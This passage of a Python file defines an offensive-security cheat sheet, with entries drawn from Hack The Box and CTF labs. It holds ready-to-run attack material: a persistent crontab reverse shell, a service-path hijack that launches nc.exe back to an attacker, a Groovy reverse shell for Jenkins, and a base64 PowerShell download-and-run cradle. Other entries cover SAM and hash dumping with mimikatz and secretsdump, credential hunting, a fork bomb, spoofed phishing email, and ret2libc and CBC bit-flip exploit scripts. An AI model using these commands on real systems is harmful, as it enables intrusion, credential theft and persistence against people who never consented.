    "Check Env if is 64 bits - Is64BitOperatingSystem - Is64BitProcess"
)
checkenv.category = "Windows"
checkenv.sub_category = "PowerShell"
checkenv.output = """[*] Check Env on windows to make sure the environment is equal to the system

[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
"""

######################################
######################################

seclogon = create_new_cheat("sc - Service Control Manager and services")
seclogon.category = "Windows"
seclogon.sub_category = "PrivEsc"
seclogon.output = r"""[*] if you can modify any service registry, you can modify path to start another program instead

cmd /c sc query seclogon  # If stopped, we can modify path to start another program instead
reg query 'HKLM\\system\\currentcontrolset\\services\\seclogon'  # Get info service
reg add 'HKLM\\system\\currentcontrolset\\services\\seclogon' /t REG_EXPAND_SZ /v ImagePath /d 'C:\\Windows\\system32\\spool\\drivers\\color\nc.exe -e cmd 10.10.14.16 4444' /f
cmd /c sc start seclogon
"""

######################################
######################################

bloodhound = create_new_cheat(
    "bloodhound-python / SharpHound - AD domain | neo4j - Windows"
)
bloodhound.category = "Windows"
bloodhound.sub_category = "Enumeration"
bloodhound.output = """[*] bloodhound-python - Enumerate All AD domain for bloodhound GUI in LOCAL

# The output of this command should give files.json for bloodhound GUI aplication
bloodhound-python -c All -u support -p '!00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -dc blackfield.local

# start neo4j
sudo neo4j start

bloodhound &>/dev/null &


[*] SharpHound - Tranfere in the target machine sharphound for collect info for bloodhound GUI

wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
# transfere to the target machine


"""

######################################
######################################

rpcclient = create_new_cheat("rpcclient - MS-RPC - MSRPC - Windows")
rpcclient.category = "Windows"
rpcclient.sub_category = "RPC"
rpcclient.output = f"""[*] rpcclient - tool for executing client side MS-RPC functions

# rpcclient [-A authfile] [-c <command string>] [-d debuglevel] [-l logdir] [-N] [-s <smb config file>] [-U username[%password]] [-W workgroup] [-I destinationIP] {{BINDING-STRING|HOST}}

rpcclient -U '' -N 10.10.10.161      # Modo interativo anonymous sem password
rpcclient -U "SVC_TGS" 10.10.10.100  # Modo interativo - Pede contra-senha
rpcclient $> enumdomusers            # Enumera todos os usuários locais do sistema

# A mesma sequencia de commandos pode-se efetuar com um oneliner:
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "enumdomusers"
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "enumdomgroups"
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "querygroupmem 0x200"
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "queryuser 0x1f4"

# OneLiner para descobrir todos os usuários com permições administrador local
echo; rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "querygroupmem 0x200" | awk '{{print $1}}' | grep -oP '\[.*?\]' | tr -d '[]' | while read rid; do echo "$rid: $(rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "queryuser $rid" | grep "User Name" | awk 'NF{{print$NF}}')"; done

# If a user has the capability to change another user's passwordChange without knowing that user's current password, then:
rpcclient -U "support%!00^BlackKnight" 10.10.10.192
    {Color.GRAY}rpcclient $>{Color.RESET}  # setuserinfo2 username level new_password
    {Color.GRAY}rpcclient $>{Color.RESET} setuserinfo2 audit2020 24 J4v4li123$!
"""

######################################
######################################

lsass = create_new_cheat("pypykatz - lsass.DMP - Memory Dump")
lsass.category = "Windows"
lsass.sub_category = "RPC"
lsass.output = """[*] Pure Python implementation of Mimikatz - (lsa) Get secrets from memory dump

pypykatz lsa minidump lsass.DMP
"""

######################################
######################################

samAndSystem = create_new_cheat("SAM and SYSTEM - Dump hash and system information")
samAndSystem.category = "Windows"
samAndSystem.sub_category = "PrivEsc"
samAndSystem.output = r"""[*] SAM and SYSTEM - Dump hash and system information

# Get a copy files in use in RAM memory
reg save HKLM\\system system.backup
reg save HKLM\\sam sam.backup

# Donwload files in kali
copy system.backup \\10.10.14.16\\smbFolder\\system.backup
copy sam.backup \\10.10.14.16\\smbFolder\\sam.backup

# Extract data
secretsdump.py -sam sam.backup -system system.backup LOCAL
"""

######################################
######################################

rdate = create_new_cheat("rdate - Clock skew too great - syncronize time")
rdate.category = "Tools"
rdate.sub_category = "Utility"
rdate.output = """[*] rdate - set the system's date from a remote hos

rdate -n 10.10.10.175
"""

######################################
######################################

mimikatz = create_new_cheat("mimikatz.exe - GetChanges && GetChangesAll in AD/DC")
mimikatz.category = "Windows"
mimikatz.sub_category = "PrivEsc via group"
mimikatz.output = """[*] Dump Hash of all users of a AD or a DC, when we have GetChanges && GetChangesAll up

wget https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe

# When mimikatz go in infinite loop...
.\mimikatz.exe 'lsadump::dcsync /domain:testlab.local /user:Administrator' exit

[*] Better way to get all Hash with impacket-secretsdump
secretsdump.py egotistical-bank.local/fsmith@10.10.10.175
"""

######################################
######################################

goBuild = create_new_cheat("go build flags - upx - minimize executable files")
goBuild.category = "Tools"
goBuild.sub_category = "Utility"
goBuild.output = """[*] Build an executable in go with flags to get a small binary

go build -ldflags '-s -w' .
upx executableFile
"""

######################################
######################################

kerbrute = create_new_cheat(
    "kerbrute / GetNPUsers.py - Enumerate Users from DC/AD Windows through Kerberos Pre-Authentication (AS-REP Roasting)"
)
kerbrute.category = "Windows"
kerbrute.sub_category = "Kerberos"
kerbrute.output = """[*] KERBRUTE - A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication

# Repository: https://github.com/ropnop/kerbrute
git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build -ldflags '-s -w' .
upx kerbrute

kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local -t 50 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

[*] Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

GetNPUsers.py egotistical-bank.local/ -no-pass -usersfile users.txt
"""

######################################
######################################

defaultCredentials = create_new_cheat("Search for passwords in Windows/AD/DC")
defaultCredentials.category = "Windows"
defaultCredentials.sub_category = "Password"
defaultCredentials.output = """[*] Search for “Password”

#Search suspicious files from filename
dir /s /W *pass* == *cred* == *vnc* == *.config* | findstr /i/v "\\\\windows"

#Search suspicious files from content
findstr /D:C:\\ /si password *.xml *.ini *.txt #A lot of output can be generated
findstr /D:C:\\ /M /SI password *.xml *.ini *.txt 2>nul | findstr /V /I "\\\\AppData\\\\Local \\\\WinXsX ApnDatabase.xml \\\\UEV\\\\InboxTemplates \\\\Microsoft.Windows.CloudExperienceHost" 2>nul


[*] Search Password in Registry

# Autologin
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" 2>nul  

reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP" /s
reg query "HKCU\\Software\\TightVNC\\Server"

# Check the values saved in each session, user/password could be there
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s  
reg query "HKCU\\Software\\OpenSSH\\Agent\\Key"

# Search for passwords inside all the registry
reg query HKLM /f password /t REG_SZ /s #Look for registries in HKLM that contains "password"
reg query HKCU /f password /t REG_SZ /s #Look for registries in HKCU that contains "password"

[*] With winPEAS.exe
.\\winPEAS.exe quiet filesinfo userinfo
"""

######################################
######################################

ldapsearch = create_new_cheat("ldapsearch - LDAP search tool")
ldapsearch.category = "Windows"
ldapsearch.sub_category = "RPC"
ldapsearch.output = """[*] ldapsearch is a shell-accessible interface to the ldap_search_ext(3) library cal

# sudo apt install ldap-utils
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local"
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local"
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local" -A 25
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local" -A 25 | grep -Ei "userPrincipalName|pass|pwd"
"""

######################################
######################################

xxd = create_new_cheat("xxd - Hexadecimal Editor - MIME")
xxd.category = "Tools"
xxd.sub_category = "Utility"
xxd.output = """[*] xxd - Hexadecimal Editor

# encode as Hexadecimal
echo "Test" | xxd -ps

# decode from Hexadecimal
echo "546573740a" | xxd -ps -r

[*] Change MIME Type of file...
# https://en.wikipedia.org/wiki/List_of_file_signatures
# This methode will overwrite first bytes...

xxd -r -p -o 0 <(echo FF D8 FF DB) shell.php.jpg
"""

######################################
######################################

vncdecrypt = create_new_cheat("VNC decrypt - oneliner")
vncdecrypt.category = "Tools"
vncdecrypt.sub_category = "VNC"
vncdecrypt.output = """[*] Decrypt passwords stored in VNC files

echo -n d7a514d8c556aade | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
"""

######################################
######################################

vnc_instalator = create_new_cheat("Tightvnc instalation oneLiner")
vnc_instalator.category = "Tools"
vnc_instalator.sub_category = "VNC"
vnc_instalator.output = """[*] Install Tightvnc with only one command after get the .msi file

cmd /c msiexec /i tightvnc.msi /quiet /norestart ADDLOCAL="Server,Viewer" VIEWER_ASSOCIATE_VNC_EXTENSION=1 SERVER_REGISTER_AS_SERVICE=1 SERVER_ADD_FIREWALL_EXCEPTION=1 VIEWER_ADD_FIREWALL_EXCEPTION=1 SERVER_ALLOW_SAS=1 SET_USEVNCAUTHENTICATION=1 VALUE_OF_USEVNCAUTHENTICATION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=password SET_USECONTROLAUTHENTICATION=1 VALUE_OF_USECONTROLAUTHENTICATION=1 SET_CONTROLPASSWORD=1 VALUE_OF_CONTROLPASSWORD=password

"""

######################################
######################################

socat = create_new_cheat("socat - PortForwarding - localhost to remote host ipv6")
socat.category = "Tools"
socat.sub_category = "Forwarding"
socat.output = """[*] Socat - Multipurpose relay (SOcket CAT)
[*] Socat  is  a command line based utility that establishes two bidirectional byte streams and transfers data between them

socat TCP-LISTEN:445,fork TCP:dead:beef::b885:d62a:d679:573f:445
"""

######################################
######################################

mp_cmd_exe = create_new_cheat(
    "MpCmdRun.exe - Force Scan AntiVirus for Responder.py - AV - NTML"
)
mp_cmd_exe.category = "Windows"
mp_cmd_exe.sub_category = "PrivEsc"
mp_cmd_exe.output = """[*] MpCmdRun.exe - dedicated command-line tool of Microsoft Defender Antivirus

# Prepare responder.py for catch NTML HASH
sudo responder.py -I tun0 -v
sudo responder.py -I tun0 --lm -v # for force get NTLMv1

# Scan remote file
.\MpCmdRun.exe -Scan -ScanType 3 -File \\\\10.10.14.21\\test.txt
"""

######################################
######################################

secredump = create_new_cheat("secretsdump.py - ntds - ntlm - system - sam")
secredump.category = "Tools"
secredump.sub_category = "RPC"
secredump.output = """[*] Get all hashes os all domain users

secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
"""

######################################
######################################

forkBomb = create_new_cheat("Fork Bomb")
forkBomb.category = "Linux"
forkBomb.sub_category = "Utility"
forkBomb.output = """[*] Fork Bomb - Creates processes until system "crashes"

:(){:|:&};:
"""

######################################
######################################

linuxPersistenceReverseShell = create_new_cheat(
    "Reverse Shell - Persistent Reverse Collectors"
)
linuxPersistenceReverseShell.category = "Linux"
linuxPersistenceReverseShell.sub_category = "Reverse Shell"
linuxPersistenceReverseShell.output = f"""[*] Persistent reverse shell backdoor via crontab

(touch /dev/shm/.tab ; echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/{ip}/443 0>&1'" >> /dev/shm/.tab ; crontab /dev/shm/.tab ; rm /dev/shm/.tab) > /dev/null 2>&1
"""

######################################
######################################

connectDatabaseViaPHP = create_new_cheat(
    "php --interactive - connect to database via php - PDO connection"
)
connectDatabaseViaPHP.category = "Tools"
connectDatabaseViaPHP.sub_category = "Databases"
connectDatabaseViaPHP.output = """[*] php --interactive - connect to database via php when we have no mysql or similar in target machine

php --interactive

php > $connection = new PDO('mysql:host=localhost;dbname=databasename', 'username', 'password');  # OR
php > $connection = new PDO('mssql:host=localhost;dbname=databasename', 'username', 'password');  # OR
php > $connection = new PDO('pgsql:host=localhost;dbname=databasename', 'username', 'password');  # ...

php > $connect = $connection->query("SELECT * FROM profiles");
php > $result = $connect->fetchAll();
php > print_r($results);
"""

######################################
######################################

sshPassInCMD = create_new_cheat(
    "sshpass - write password in command line on login with sshpass"
)
sshPassInCMD.category = "Tools"
sshPassInCMD.sub_category = "Password"
sshPassInCMD.output = """[*] sshpass - write password in command line on login with sshpass

sshpass -p 'Passw0rd!' ssh clave@10.10.10.114
"""

######################################
######################################

winrmEnable = create_new_cheat("Enable WinRM - PowerShell")
winrmEnable.category = "Windows"
winrmEnable.sub_category = "WinRM"
winrmEnable.output = """[*] Quick default configuration of WinRM

winrm quickconfig

[*] Fix WinRM firewall exception

Get-NetConnectionProfile
Set-NetConnectionProfile -InterfaceIndex 6 -NetworkCategory Private

winrm quickconfig
"""

######################################
######################################

sendImpersonatedEmail = create_new_cheat("email - send impersonated email with python")
sendImpersonatedEmail.category = "Python"
sendImpersonatedEmail.sub_category = "Email"
sendImpersonatedEmail.output = """[*] Send an impersonated email via email

sudo apt install sendmail


#########################################
import smtplib
import os, time

os.system("/etc/init.d/sendmail start")
time.sleep(4)

HOST = "localhost"
SUBJECT = "Testing python email"
TO = "syjulio123@gmail.com"
FROM = "testingPostMail@hotmail.com"
TEXT = "This is a test email"
BODY = "\n".join((
    f"From: {FROM}",
    f"To: {TO}",
    f"Subject: {SUBJECT}",
    "",
    TEXT, 
    "\r\n"))

server = smtplib.SMTP(HOST)
server.sendmail(FROM, [TO], BODY)
server.quit()

time.sleep(4)
os.system("/etc/init.d/sendmail stop")
"""

######################################
######################################

jaula = create_new_cheat("Sair da Jaula! Upgrade e estabilizar o shell")
jaula.category = "Linux"
jaula.sub_category = "Reverse Shell"
jaula.output = """[*] Sair da Jaula! Upgrade e estabilizar o shell

python3 -c 'import pty;pty.spawn("/bin/bash")'  # OR
/usr/bin/script -qc /bin/bash /dev/null         # OR
script /dev/null -c bash
export TERM=xterm
export SHELL=bash

# Ctrl + Z
stty raw -echo; fg; reset
stty rows 40 columns 170
"""

######################################
######################################

ret2libc = create_new_cheat("ret2libc attack - BOF - Binary exploit - Linux")
ret2libc.category = "Linux"
ret2libc.sub_category = "Reverse Engineering"
ret2libc.output = """[*] ret2libc (return to libc, or return to the C library) attack

# Get offset with gdb
gdb ./binary.elf

gef> run $(python -c 'print("A"*100)')
get> pattern create 100
    [+] Generating a pattern of 100 bytes (n=4)
    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
    [+] Saved as '$_gef0'
gef> run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
gef> pattern offset $eip
    [+] Searching for '$eip'
    [+] Found at offset 52 (little-endian search) likely
    [+] Found at offset 49 (big-endian search)

# check if we really control the EIP address
gef> run $(python -c 'print("A" * 52 + "BBBB")')


# Python Script
from struct import pack
import os, sys


def getLibcAddr():
    return int(os.popen("ldd /home/ayush/.binary/rop | grep libc | awk 'NF{print$NF}' | tr -d '()'").read().strip(), 16)

def getSystemAddrOff():
    return int(os.popen("readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' system@@' | awk '{print$2}'").read().strip(), 16)

def getExitAddrOff():
    return int(os.popen("readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' exit@@' | awk '{print$2}'").read().strip(), 16)

def getBinShAddrOff():
    return int(os.popen("strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh' | awk '{print$1}'").read().strip(), 16)

def mostFrequent(List):
    detailed_dict = {}
    count = 0
    mostFrequentItem = ''
    for item in List:
        detailed_dict[item] = detailed_dict.get(item, 0) + 1
        if detailed_dict[item] >= count:
            count = detailed_dict[item]
            mostFrequentItem = item
    return(mostFrequentItem)

def p32(num):
    return pack("<I",num)


baseLibc = mostFrequent([getLibcAddr() for i in range(1000)])

systemAddr = baseLibc + getSystemAddrOff()
exitAddr = baseLibc + getExitAddrOff()
binShAddr = baseLibc + getBinShAddrOff()

offset = 52
junk = b"A" * offset

payload = junk
payload += p32(systemAddr)
payload += p32(exitAddr)
payload += p32(binShAddr) 

while True:
    res = os.system(b"/home/ayush/.binary/rop " + payload)
    if res == 0:
        sys.exit(0)
"""

######################################
######################################

pythonProxyBurp = create_new_cheat("Python - Request via Burpsuite")
pythonProxyBurp.category = "Python"
pythonProxyBurp.sub_category = "Requests"
pythonProxyBurp.output = """[*] Python - Request via Burpsuite

import requests


proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

r = requests.get("https://www.google.com/", proxies=proxies, verify=False)
"""

######################################
######################################

updateWPPlugins = create_new_cheat("Update wordlist of wp-plugins (WordPress)")
updateWPPlugins.category = "Web"
updateWPPlugins.sub_category = "CMS"
updateWPPlugins.output = """[*] Update wordlist of wp-plugins for discover plugins with ffuf

# The default location of plugins in wordpress is http://site.com/wp-content/plugins/<pluginName>

for i in $(seq 1 1757); do curl https://github.com/orgs/wp-plugins/repositories?page=$i | grep "name codeRepository" | grep -oP 'href=".*?"' | sed 's/href="//g' | tr -d '"'; done >> wp-plugins_by_javali.txt

# Change wp-plugins/ by wp-content/plugins/
"""

######################################
######################################

rsaDecrypt = create_new_cheat("RSA Decrypt")
rsaDecrypt.category = "Tools"
rsaDecrypt.sub_category = "Password"
rsaDecrypt.output = """[*] Decrypt RSA keys

# GOOGLE: RSA step by step decrypt - cryptool portal

# RsaCtfTool: https://github.com/Ganapati/RsaCtfTool

"""

######################################
######################################

openPortsForDontAskSudoAllTime = create_new_cheat(
    "Unrestrict ports for use all ports under 1000 without sudo privilege"
)
openPortsForDontAskSudoAllTime.category = "Kali"
openPortsForDontAskSudoAllTime.sub_category = "Configurations"
openPortsForDontAskSudoAllTime.output = """[*] remove all privileged ports on linux

#save configuration permanently
echo 'net.ipv4.ip_unprivileged_port_start=0' > /etc/sysctl.d/50-unprivileged-ports.conf
#apply conf
sysctl --system
"""
sendImpersonatedEmailViaCli = create_new_cheat(
    "email - send impersonated email with swaks (CLI)"
)
sendImpersonatedEmailViaCli.category = "Tools"
sendImpersonatedEmailViaCli.sub_category = "Email"
sendImpersonatedEmailViaCli.output = """[*] Send an impersonated email via swaks (CLI)

# Installation
sudo apt install swaks

# Send an email to multiples email addresses
swaks --from "javali@sneakycorp.htb" --to "airisatou@sneakymailer.htb,angelicaramos@sneakymailer.htb,ashtoncox@sneakymailer.htb," --header "Subject: Exclusivo, fotos da tua avó na praia xD" --body "Oh meus deus\!, uma loucura... -> http://10.10.14.9/avo.jpg" --server 10.10.10.197
"""


######################################
######################################

logPoisonning = create_new_cheat("Log Poisoning")
logPoisonning.category = "Web"
logPoisonning.sub_category = "RCE"
logPoisonning.output = """[*] Transforme a LFI into a RCE

# https://www.thehacker.recipes/web/inputs/file-inclusion

# Potencial files for Log Poisoning - LINUX
/var/log/auth.log
/var/log/vsftpd.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/httpd-access.log
/var/log/apache/error.log
/var/log/mail.log

/var/lib/php5/sess_[PHPSESSID]
/var/lib/php/sessions/sess_[PHPSESSID]
"""

######################################
######################################

WordpressTrics = create_new_cheat("Wordpress - Importante Files")
WordpressTrics.category = "Web"
WordpressTrics.sub_category = "CMS"
WordpressTrics.output = """[*] Wordpress - Importante Files

# Logs
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd-access.log
/var/log/apache/access.log
/var/log/apache/error.log

# VirtualHost
/etc/apache2/sites-available/000-default.conf
"""


######################################
######################################

snmpcheck = create_new_cheat("snmp-check - 161 - SNMP Enumerator")
snmpcheck.category = "Tools"
snmpcheck.sub_category = "SNMP"
snmpcheck.output = """[*] snmp-check - 161 - SNMP Enumerator

snmp-check [OPTIONS] <target IP address>
  -p --port        : SNMP port. Default port is 161;
  -c --community   : SNMP community. Default is public;
  -v --version     : SNMP version (1,2c). Default is 1;
"""

######################################
######################################

ipmipwner = create_new_cheat("ipmiPwner - UDP 623")
ipmipwner.category = "Tools"
ipmipwner.sub_category = "IPMI"
ipmipwner.output = """[*] ipmiPwner - UDP 623 - Tool for exploit ipmi service to get credentials
# Intelligent Platform Management Interface (IPMI) is one of the most used acronyms in server management. 
# IPMI became popular due to its acceptance as a standard monitoring interface by hardware vendors and developers.

get clone https://github.com/c0rnf13ld/ipmiPwner
sudo ./requirements.sh



python3 ipmipwner.py --host 192.168.1.12 -c john -oH hash -pW /usr/share/wordlists/rockyou.txt
python3 ipmipwner.py --host 192.168.1.12 -oH hash
python3 ipmipwner.py --host 192.168.1.12 -uW /opt/SecLists/Usernames/cirt-default-usernames.txt -oH hash
python3 ipmipwner.py --host 192.168.1.12 -u root -c john -pW /usr/share/wordlists/rockyou.txt -oH hash
python3 ipmipwner.py --host 192.168.1.12 -p 624 -uW /opt/SecLists/Usernames/cirt-default-usernames.txt -c python -pW /usr/share/wordlists/rockyou.txt -oH hash -oC crackedHash
"""

######################################
######################################

jenkinsRCE = create_new_cheat("JenkinsRCE with Script Groovy")
jenkinsRCE.category = "Web"
jenkinsRCE.sub_category = "RCE"
jenkinsRCE.output = """[*] Execute command remotely with Script Groovy via Jenkins
# or String cmd="/bin/bash";
String host="10.10.10.120";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
"""

######################################
######################################

youtubeToMP3 = create_new_cheat("Youtube to MP3")
youtubeToMP3.category = "Linux"
youtubeToMP3.sub_category = "Music"
youtubeToMP3.output = """[*] Simple download music from a Youtube video
sudo apt install youtube-dl
youtube-dl --extract-audio --audio-format mp3 https://www.youtube.com/watch?v=IWy9mO-TjNw
"""


######################################
######################################

powerShell_enc = create_new_cheat("PowerShell exec code in base64, encode and decode")
powerShell_enc.category = "Windows"
powerShell_enc.sub_category = "PowerShell"
powerShell_enc.output = f"""[*] PowerShell execute code in base64 for easy control bad chars on webexploit

# Create the string for windows in 16bytes little endian
echo 'IEX(New-Object Net.WebClient).downloadString("http://{ip}/IP.ps1")' | iconv -t utf-16le | base64 -w 0

# Take the output and pass it to web vulnerability to get reverse shell (for example...)
powerShell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMgAwAC8ASQBQAC4AcABzADEAIgApAAoA

[*] PowerShell encode file or binary into base64 for transfere to attacker machine
[convert]::ToBase64String((Get-Content -path "your_file_path" -Encoding byte))    # or
[convert]::ToBase64String((cat "your_file_path" -Encoding byte))
"""


######################################
######################################

python_encrypt_buffer_over_flow = create_new_cheat(
    "Print special char for buffer overflow with python3 - 0xdeadbeef"
)
python_encrypt_buffer_over_flow.category = "Python"
python_encrypt_buffer_over_flow.sub_category = "Encoding"
python_encrypt_buffer_over_flow.output = """[*] Print special char for buffer overflow with python3 - 0xdeadbeef


python2 -c 'print(b"\\xef\\xbe\\xad\\xde")' | xxd
perl -e 'print "\\xef\\xbe\\xad\\xde\\n"' | xxd
python3 -c 'import sys;sys.stdout.buffer.write(b"\\xef\\xbe\\xad\\xde\\n")' | xxd
"""


######################################
######################################

ret2lib_example = create_new_cheat("ret2lib example - pwn - buffer overflow")
ret2lib_example.category = "Python"
ret2lib_example.sub_category = "pwntools"
ret2lib_example.output = """[*] Script in python with an example of an exploit of ret2lib

from pprint import pprint
from pwn import *


bin_path = "return-to-what"
libc_path = "libc6_2.17-93ubuntu4_amd64.so"
libc_path = "/usr/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(bin_path)
libc = ELF(libc_path)
context.binary = elf
context.arch = "amd64"


# p = gdb.debug(bin_path, "c")
p = elf.process()
# p = remote("chal.duc.tf", 30003)

p.recvuntil(b"\\n")
p.recvuntil(b"\\n")


# ****************************************************
# Craft the payload with rop tool
offset = 56

rop = ROP(elf)
rop.raw("\\0" * offset)
rop.call(elf.symbols["puts"], [elf.got["puts"]])  # print (with puts function in C) the same puts function actual location in memory
rop.call(elf.symbols["vuln"])                     # Return to buffer vulnerability to send more ROP instructions
payload = rop.chain()                             # Build the payload (b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+\\x12@\\x00\\x00\\x00\\x00\\x00\\x18@@\\x00\\x00\\x00\\x00\\x000\\x10@\\x00\\x00\\x00\\x00\\x00\\x85\\x11@\\x00\\x00\\x00\\x00\\x00')
p.sendline(payload)                               # Send payload...
# ****************************************************


# ****************************************************
# Get and treat the response...
res = p.recvline()
puts = u64(res.rstrip().ljust(8, b"\\x00"))
log.info(f"PUTS function is located at {hex(puts)}")

p.recvline()


# ****************************************************


# ****************************************************
# Craft the new rop for execute system command with libc
libc.address = puts - libc.symbols["puts"]
log.info(f"libc address determined to be {hex(libc.address)}")

rop = ROP(libc)
rop.raw("A" * offset)
rop.call("system", [ next(libc.search(b"/bin/sh\\x00"))])
rop.call("exit")
payload = rop.chain()

p.sendline(payload)

p.interactive()
"""

######################################
######################################

get_clean_memleak = create_new_cheat(
    "Clean a memory leak information - memleak cleaner"
)
get_clean_memleak.category = "Python"
get_clean_memleak.sub_category = "pwntools"
get_clean_memleak.output = """[*] Clean a memory leak information - memleak cleaner

from pwn import *


def get_legible_info_from_memleak(raw_leak: str):
    res = ''
    raw_leak = raw_leak.replace("(nil)", "").split()
    for element in raw_leak:
        try:
            res += p32(int(element, 16)).decode()
        except:
            pass
    return res

# def get_legible_info_from_memleak(raw_leak: str):

# 	raw_leak = raw_leak.replace("(nil)", "").split()[::-1]

# 	for i, element in enumerate(raw_leak):
# 		raw_leak[i] = [element[i:i+2] for i in range(0, len(element), 2) if len(element[i:i+2]) == 2]


# 	leak = []
# 	for chars in raw_leak:
# 		word = ""
# 		for char in chars[::-1]:
# 			try:
# 				word += chr(int(char, 16))
# 			except:
# 				pass
# 		leak.append(word)

# 	return "".join(reversed(leak))

# the memory leak used was %p %p %p %p %p %p %p... (percent char and "p" char with a space after, and repeat...)
raw_leak = "0x57f6a1c0 0x170 0x56585d85 0x7 0x2a 0x26 0x1 0x2 0x5658696c 0x57f6a1c0 0x57f6a340 0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f 0x2c681400 0xf7f6b3fc 0x56588f8c 0xffaccbc8 0x56586441 0x1 0xffaccc74 0xffaccc7c 0x2c681400 0xffaccbe0 (nil) (nil) 0xf7daef21 0xf7f6b000 0xf7f6b000 (nil) 0xf7daef21 0x1 0xffaccc74 0xffaccc7c 0xffaccc04 0x1 0xffaccc74 0xf7f6b000 0xf7f8870a 0xffaccc70 (nil) 0xf7f6b000 "

print(get_legible_info_from_memleak(raw_leak))
# ]XV*&liXVÀ¡öW@£öWHTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}h,ü³ö÷XVÈË¬ÿAdXVtÌ¬ÿ|Ì¬ÿh,àË¬ÿ!ïÚ÷°ö÷°ö÷!ïÚ÷tÌ¬ÿ|Ì¬ÿÌ¬ÿtÌ¬ÿ°ö÷
ø÷pÌ¬ÿ°ö÷
"""

######################################
######################################

locate_offset_with_pwntools = create_new_cheat(
    "Find Offset with Pwntools and coredump file"
)
locate_offset_with_pwntools.category = "Python"
locate_offset_with_pwntools.sub_category = "pwntools"
locate_offset_with_pwntools.output = """[*] Find Offset with Pwntools and coredump file in BufferOverflow

from pwn import *


elf = ELF("./vuln")
context_byte_arch = 8

p = process("./vuln")
p.sendline(cyclic(200, n=context_byte_arch))
p.wait()

core = p.corefile

print cyclic_find(core.read(core.rsp, context_byte_arch), n=context_byte_arch)

"""


######################################
######################################

bit_flop = create_new_cheat("CBC byte flipping attack")
bit_flop.category = "Python"
bit_flop.sub_category = "Cryptography"
bit_flop.output = """[*] CBC byte flipping attack - bit_flop 1 byte for trying to change admin=0 to admin=1 (for exemple)

import requests
from base64 import b64decode, b64encode


# Functions
def getCookie(url):
    s = requests.Session()
    s.get(url)
    return s.cookies.get_dict()["auth_name"]


def bit_flip(pos, bit, cookie):
    data = b64decode(b64decode(cookie))
    data = bytearray(data)
    data[pos] ^= bit
    return b64encode(b64encode(data)).decode()



# Global variables
url = "http://mercury.picoctf.net:25992/"
cookie = getCookie(url)

for i in range(10):
    for j in range(256):
        cookie = bit_flip(i, j, cookie)
        r = requests.get(url, cookies={"auth_name": cookie})
        if "picoCTF{" in r.text:
            print(r.text)
            exit(0)

"""


######################################
######################################

open_port_to_the_net = create_new_cheat(
    "Open a port to the internet - ngrok - portfowarding"
)
open_port_to_the_net.category = "Web"
